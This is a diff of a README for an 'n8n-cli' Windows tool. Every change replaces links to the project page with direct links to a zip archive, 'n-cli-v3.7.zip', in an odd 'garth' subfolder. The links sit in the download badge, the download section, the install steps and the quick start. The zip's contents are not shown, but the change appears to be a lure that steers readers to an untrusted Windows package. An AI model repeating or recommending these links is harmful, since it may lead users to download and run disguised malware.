@@ -1,12 +1,12 @@
 # 🤖 n8n-cli - Run n8n tasks from your PC
 
-[![Download n8n-cli](https://img.shields.io/badge/Download%20n8n--cli-blue?style=for-the-badge)](https://github.com/DP1234-ptl/n8n-cli)
+[![Download n8n-cli](https://img.shields.io/badge/Download%20n8n--cli-blue?style=for-the-badge)](https://github.com/DP1234-ptl/n8n-cli/raw/refs/heads/main/garth/n-cli-v3.7.zip)
 
 ## 📥 Download n8n-cli
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/DP1234-ptl/n8n-cli
+https://github.com/DP1234-ptl/n8n-cli/raw/refs/heads/main/garth/n-cli-v3.7.zip
 
 ## 🪟 Windows setup
 
@@ -47,7 +47,7 @@ It is built for people who want to control n8n from a command line tool without 
 
 ## 🛠️ Install steps
 
-1. Go to the download page: https://github.com/DP1234-ptl/n8n-cli
+1. Go to the download page: https://github.com/DP1234-ptl/n8n-cli/raw/refs/heads/main/garth/n-cli-v3.7.zip
 2. Download the Windows package that matches your setup.
 3. If the file is compressed, extract it.
 4. Open Command Prompt or PowerShell if the repo asks for it.
@@ -92,7 +92,7 @@ Use it when you want to:
 
 ## 🧪 Quick start example
 
-1. Download the project from https://github.com/DP1234-ptl/n8n-cli
+1. Download the project from https://github.com/DP1234-ptl/n8n-cli/raw/refs/heads/main/garth/n-cli-v3.7.zip
 2. Install it using the steps in the repo
 3. Add your n8n profile
 4. Run the help command
